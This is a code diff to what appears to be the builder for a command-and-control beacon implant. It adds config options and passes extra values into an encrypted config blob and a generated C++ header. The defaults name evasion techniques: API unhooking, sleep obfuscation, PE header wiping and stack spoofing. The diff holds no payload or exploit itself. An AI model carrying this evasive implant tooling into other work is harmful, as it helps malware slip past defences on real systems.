@@ -134,6 +134,13 @@ _DEFAULT_CONFIG = {
     "lazy_unhook": False,
     "pad": False,
     "pad_max": 1024,
+    "max_response_size": 67108864,
+    "post_build": {
+        "append": [],
+    },
+    "in_memory_append": {
+        "append": [],
+    },
     "sleep_obfuscation": "none",
     "sleep_wipe_pe_headers": False,
     "sleep_stack_spoof": False,
@@ -519,18 +526,13 @@ class _BuildWorker(QObject):
                 if 'beacon_id' not in self._config:
                     self._config['beacon_id'] = derive_beacon_id(self._config['crypto_key'])
 
-                errors = validate_config(self._config)
+                errors = validate_config(self._config, _SCHEMA_PATH)
                 if errors:
-                    msg = (
-                        "Validation errors:\n  " + "\n  ".join(errors)
-                        if isinstance(errors, list)
-                        else f"Validation error: {errors}"
-                    )
-                    self.error.emit(msg)
+                    self.error.emit("Validation errors:\n  " + "\n  ".join(errors))
                     return
 
                 self.progress.emit("Building config blob...")
-                blob, nonce, config_key = build_config_blob(self._config)
+                blob, nonce, config_key, append_magic, append_data, pcfg_magic = build_config_blob(self._config)
                 self.progress.emit(
                     f"Blob size: {len(blob)} bytes | Config key: {config_key.hex()}"
                 )
@@ -548,7 +550,12 @@ class _BuildWorker(QObject):
                 include_dir = os.path.join(bin_dir, "include")
                 os.makedirs(include_dir, exist_ok=True)
                 header_path = os.path.join(include_dir, "generated_config.h")
-                generate_cpp_header(blob, header_path, nonce, config_key, channels)
+                generate_cpp_header(
+                    blob, header_path, nonce, config_key, channels,
+                    append_magic,
+                    sleep_obf_method=self._config.get("sleep_obfuscation", "ekko"),
+                    pcfg_magic=pcfg_magic,
+                )
                 self.progress.emit(f"Wrote: {header_path}")
 
                 crypto_key = self._config.get("crypto_key", "")
